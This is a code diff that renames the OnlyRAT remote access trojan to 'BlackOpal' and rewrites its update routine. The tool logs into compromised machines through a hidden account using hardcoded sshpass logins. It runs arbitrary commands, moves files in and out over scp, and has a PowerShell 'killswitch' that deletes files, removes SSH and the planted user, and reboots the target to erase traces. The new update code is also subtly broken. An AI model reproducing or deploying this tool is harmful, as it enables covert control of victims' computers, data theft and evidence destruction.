@@ -7,6 +7,7 @@ import os
 import sys
 import socket
 import getpass
+import requests
 import random as r
 from datetime import datetime
 
@@ -70,8 +71,8 @@ options_menu = """
         [*] Select an [option]...
 """
 username = getpass.getuser() # gets username
-header = f"[~] {username}@onlyrat $ " # sets up user input interface
-
+header = f"[~] {username}@blackopal $ " # sets up user input interface
+default_path = os.getcwd() # gets current working directory
 
 
 # clear screen
@@ -97,7 +98,7 @@ def current_date():
 def connect(address, password, port):
     print("\n [*] Connecting to target...")
 
-    os.system(f"sshpass -p \"{password}\" ssh onlyrat@{address} -p {port}")
+    os.system(f"sshpass -p \"{password}\" ssh BlackOpal@{address} -p {port}")
 
 # remote uploads with SCP
 def remote_upload(address, password, upload, path, port):
@@ -105,7 +106,7 @@ def remote_upload(address, password, upload, path, port):
     print("\n[*] Starting Upload...")
 
     # scp upload
-    os.system(f"sshpass -p \"{password}\" scp -P {port} -r {upload} onlyrat@{address}:{path}")
+    os.system(f"sshpass -p \"{password}\" scp -P {port} -r {upload} BlackOpal@{address}:{path}")
 
     print("[+] Upload complete\n")
 
@@ -117,20 +118,20 @@ def remote_download(address, password, path, port):
     # scp download
     os.system("mkdir ~/Downloads")
 
-    os.system(f"sshpass -p \"{password}\" scp -P {port} onlyrat@{address}:{path} ~/Downloads")
+    os.system(f"sshpass -p \"{password}\" scp -P {port} BlackOpal@{address}:{path} ~/Downloads")
 
     print("[+] Download saved to \"~/Downloads\"\n")
 
 # run commands remotely with SCP
 def remote_command(address, password, command, port):
 
-    os.system(f"sshpass -p \"{password}\" ssh onlyrat@{address} -p {port} '{command}'")
+    os.system(f"sshpass -p \"{password}\" ssh BlackOpal@{address} -p {port} '{command}'")
 
 # killswitch
 def killswitch(address, password, working, username, port):
     print("\n[*] Prepping killswitch...")
     # web requests
-    killswitch_command = f"powershell /c Remove-Item {working}/* -r -Force; Remove-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0; Remove-Item \"C:/Users/onlyrat\" -r -Force; Remove-LocalUser -Name \"onlyrat\"; shutdown /r"
+    killswitch_command = f"powershell /c Remove-Item {working}/* -r -Force; Remove-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0; Remove-Item \"C:/Users/BlackOpal\" -r -Force; Remove-LocalUser -Name \"BlackOpal\"; shutdown /r"
     print("[+] Killswitch prepped")
 
     # installing killswitch
@@ -165,55 +166,40 @@ def download(address, password, port):
     print("\n[*] Downloading...")
     remote_download(address, password, download_file, port)
 
-# update OnlyRAT
+# update BlackOpal
 def update():
 
     print("\n[*] Checking for updates...")
+    # check for updates
+    # cd into  default path and check version.txt
+    os.chdir(default_path)
+    with open("version.txt") as f:
+        version = f.read()
+        #check version with version.txt on github
+        github_version = requests.get("https://raw.githubusercontent.com/BlackOpal/BlackOpal/master/version.txt").text
+        if version < github_version:
+            print("[+] Updating...")
+            # update
+            os.system("git clone https://github.com/Envxsion/BlackOpal.git")
+            os.system("cd BlackOpal && git pull")
+            
+        else:
+            print("\n[+] BlackOpal already up to date")
+            print("[*] Hit any key to continue...\n")
+            input(header)
+            #main()
 
-    # get latest version nubmer
-    os.system(f"curl https://raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/version.txt | tee ~/.OnlyRAT/latest.txt")
-
-    # save version nubmers to memory
-    current_version = float(open(f"{local_path}/version.txt", "r").read())
-    latest_version = float(open(f"{local_path}/latest.txt", "r").read())
-
-    # remove version number file
-    os.system("rm -rf ~/.OnlyRAT/latest.txt")
-
-    # if new version is available, update
-    if latest_version > current_version:
-        print("\n[+] Update found")
-        print("[~] Update Onlyrat? [y/n]\n")
-
-        # user input, option
-        option = input(f"{header}")
-        
-        # update
-        if option == "y":
-            os.system(f"bash ~/.OnlyRAT/payloads/update.sh")
-
-        # exception
-        # else:
-        #     main()
-
-    # otherwise, run main code
-    else:
-        print("\n[+] OnlyRAT already up to date")
-        print("[*] Hit any key to continue...\n")
-        input(header)
-        #main()
-
-# uninstalls onlyrat
+# uninstalls BlackOpal
 def remove():
     # confirmation
-    print("\n[~] Are you sure you want to remove OnlyRAT [y/n]\n")
+    print("\n[~] Are you sure you want to remove BlackOpal [y/n]\n")
 
     # user input
     option = input(header)
 
-    # delete OnlyRAT
+    # delete BlackOpal
     if option == "y":
-        os.system("rm -rf ~/.OnlyRAT")
+        os.system("rm -rf ~/.BlackOpal")
 
     # cancel
     if option == "n":
@@ -271,15 +257,15 @@ def cli(arguments):
                 exit()
             # kill switch
             elif option == "killswitch":
-                print("\n[~] Are you sure you want to remove OnlyRAT from your target [y/n")
+                print("\n[~] Are you sure you want to remove BlackOpal from your target [y/n")
                 confirm = input(header)
                 if confirm == "y":
                     killswitch(ipv4, password, working_direcory, target_username, port)
                 else:
                     main()
-            # onlyrat manual
+            # BlackOpal manual
             elif option == "man" or option == "manual":
-                os.system(f"xdg-open https://github.com/CosmodiumCS/OnlyRAT/blob/main/payloads/manual.md")
+                os.system(f"xdg-open https://github.com/CosmodiumCS/BlackOpal/blob/main/payloads/manual.md")
             # remove installation
             elif option == "remove" or option == "uninstall":
                 remove()
